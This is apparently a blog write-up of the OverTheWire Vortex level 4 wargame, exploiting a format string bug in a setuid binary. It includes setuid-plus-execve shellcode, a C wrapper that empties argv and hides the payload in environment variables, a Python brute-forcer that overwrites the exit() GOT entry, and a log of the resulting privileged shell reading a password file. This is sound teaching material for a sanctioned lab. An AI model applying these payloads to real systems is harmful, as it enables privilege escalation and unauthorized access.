---
title:  "[CTF] OverTheWire Vortex Level 4"
---

![Logo](/assets/images/vortex4.png)

## Context

[This level](http://overthewire.org/wargames/vortex/vortex4.html) looks like a simple 3 lines program, containing a common issue - format string vulnerability:
```c
int main(int argc, char **argv)
{
 if(argc) exit(0);
 printf(argv[3]);
 exit(EXIT_FAILURE);
}
```

## 1. Bypass the check for arguments count
The program exits if the _`argc`_ variable is different than 0. _`argc`_ represents the length of _`argv`_ array, which has on the first position the program name (the name appearing on top and like utilities, for example). So _`argc`_ is always >=1.
But If we know how arguments and environment variables are passed to the main function when executing the binary,  we can bypass the verification and also pass something meaningful to _`printf`_ in _`argv[3]`_ argument.  The stack looks like this:
```
| argc | argv[0] | argv[1] ... |argv[argc-1]| NULL |env[0]|...|env[n]|NULL|
```

Where the first _`NULL`_ indicates the end of the _`argv`_ array, and the second one the end of the environment variables array. So if we pass _`NULL`_ as the _`argv`_ array, when the program tries to access _`argv[3]`_, it will in fact access _`env[2]`_, because the stack would look like this (_`argv[0]`_ points to the _`NULL`_ byte):
```
| 0 | NULL | env[0] | env[1] | env[2] | ...
```

In Python I couldn't call one of the _`exec`_ functions with _`argv`_ set to _`NULL`_, so I've used another method:
```c
char exe[] = "/vortex/vortex4";
 
char* argv[] = { NULL }; 
char* env[] = {"env0", "env1", "TEST", NULL};
 
execve(exe, argv, env);
```

## 2.  Pass the format string attack into an environment variable
We have to find out the approximate location of the environment variables in the memory. The Vortex labs machine has ASLR disabled. We can test with and without ASLR to see the variation of the environment variables' address, using the following simple program:
```c
/* 
 * Test program to find the location of envirnment variables on stack.
 *  - test with/without ASLR
 * 
 * To disable ASLR: 
 * echo 0 > /proc/sys/kernel/randomize_va_space
 * 
 * To enable ASLR:
 * echo 2 > /proc/sys/kernel/randomize_va_space
 * 
 */
 
#include <stdio .h>
 
extern char **environ;
 
/* Return the current stack pointer */
unsigned long find_esp(void){
 // Copy stack pointer into EAX
    __asm__("mov %esp, %eax");
     
    // Return value of the function is in EAX
}
 
int  main() {
 char **env = NULL;
  
    for (env = environ; *env; ++env)
        printf("%p:\t%s\n", env, *env);
 
    unsigned long p = find_esp(); 
    printf ("Current stack pointer: Ox%lx\n" , p) ;
         
    return 0;
}
```

## 3. Redirect program flow
We decide an address to overwrite to change the flow of the program. We can use the same trick as in the previous level: replace the address of _`exit()`_ function in _`.plt`_, which is called at the end of the program. We find it by searching relocations sections in the binary:
```bash
vortex4@melissa:/vortex$ readelf -r ./vortex4
[..]
Relocation section '.rel.plt' at offset 0x294 contains 4 entries:
 Offset     Info    Type            Sym.Value  Sym. Name
0804a000  00000107 R_386_JUMP_SLOT   00000000   __gmon_start__
0804a004  00000207 R_386_JUMP_SLOT   00000000   __libc_start_main
0804a008  00000307 R_386_JUMP_SLOT   00000000   printf
0804a00c  00000407 R_386_JUMP_SLOT   00000000   exit
```

## 4.Shellcode
We'll place a shellcode (I've used the same 32 bytes I've used in the previous level, _`setuid + execve`_) in  the environment variable, with a big NOP sled before (I've used 500 bytes). In the format string before, try to overwrite the address we found above, _`0x0804a00c`_ (which I've actually replaced in 4 bytes: _`0x0804a00c`_, _`0x0804a00d`_, _`0x0804a00e`_, _`0x0804a00f`_). 

This was the hardest part. I've made a Python wrapper over the C wrapper containing the _`execve`_ instruction, that passes and brute-forces different format strings.

A good exercise to test the vulnerability is to first try to read memory (using _`%x`_ or _`%s`_ instead of _`%n`_ for writing), to find the actual position of the format string on the stack. I actually found that I needed 106 bytes to get to the format string on the stack. A trick that can be used here: direct parameter access in printf (using **$**), detailed in the [Single Unix Specification ](http://pubs.opengroup.org/onlinepubs/7908799/xsh/fprintf.html). For me, I could access the format string with the following parameter:
```bash
fmt = "AAAABBBBCCCCDDDD..." + "%106$x%107$x%108$x%109$x"
```
I've adjusted it with fillers ('.'), and tuned the offset until I reached the correct one, 106. The Python brute-forcing script:
```python
import subprocess
 
''' 
Script to pass the format string and address to be overwritten to
the vortex 4 wrapper binary
'''
 
# 4 bytes to be modified (address of exit() in .plt - 0x0804a00c)
addr =  "\x0c\xa0\x04\x08" + \
        "\x0d\xa0\x04\x08" + \
        "\x0e\xa0\x04\x08" + \
        "\x0f\xa0\x04\x08"
 
# Read it, after many trial and errors
#fmt = "AAAABBBBCCCCDDDD..." + "%106$x%107$x%108$x%109$x"
 
for i in range(1, 255):
        for j in range(1, 255):
                fmt = addr + "...." + \
                "%106$n%5$0" + str(i) + "d" + \
                "%107$n%5$0" + str(j) + "d" + \
                "%108$n" + \
                "%109$n"
                print "%d %d fmt: %s: " % (i, j, fmt)
                p = subprocess.Popen(['/tmp/myl4', fmt])
                 
                p.wait()
                # Ctrl-D to continue
```

And the C wrapper with _`execve`_ over vortex4 binary:
```c
/*
 * Wrapper over vortex 4 binary: 
 *  - byapss first argc check
 *  - pass shellcode in environment variable
 *  - receive format string from python wrapper (.. easier) 
 */
 
#include <stdio .h>
#include <string .h>
 
/* 32 bytes setuid(0) + execve("/bin/sh",["/bin/sh",NULL]); */
char shellcode[] = "\x6a\x17\x58\x31\xdb\xcd\x80\x31\xd2\x6a\x0b\x58\x52"
        "\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53"
        "\x89\xe1\xcd\x80";
 
char padding[500];
char NOP = '\x90';
int nops = 500;
 
int main(int argc, char **args) {
 char exe[] = "/vortex/vortex4";
 char sh[600] = {0};
  
 // Fill with lots of NOPs to make sure we reach the shellcode
 memset(padding, NOP, nops);
  
 memcpy(sh, padding, nops);
 memcpy(sh+nops, shellcode, strlen(shellcode));
  
 // argc wil be 0, because argv[0] is not set
 char* argv[] = { NULL }; 
 char* env[] = {"env0", "env1", args[1], sh, NULL};
 
 execve(exe, argv, env);
  
 return 0;
}
```

## 5. Putting pieces together: 
```bash
vortex4@melissa:/tmp$ vim myl4.c
vortex4@melissa:/tmp$ vim myl4.py
vortex4@melissa:/tmp$ gcc -o myl4 myl4.c
vortex4@melissa:/tmp$ python myl4.py
[..]
202 33 fmt: 
���....%106$n%5$0202d%107$n%5$033d%108$n%109$n: 
$ id
uid=5004(vortex4) gid=5004(vortex4) euid=5005(vortex5) groups=5005(vortex5),5004(vortex4)
$ cat /etc/vortex_pass/vortex5
*****
```
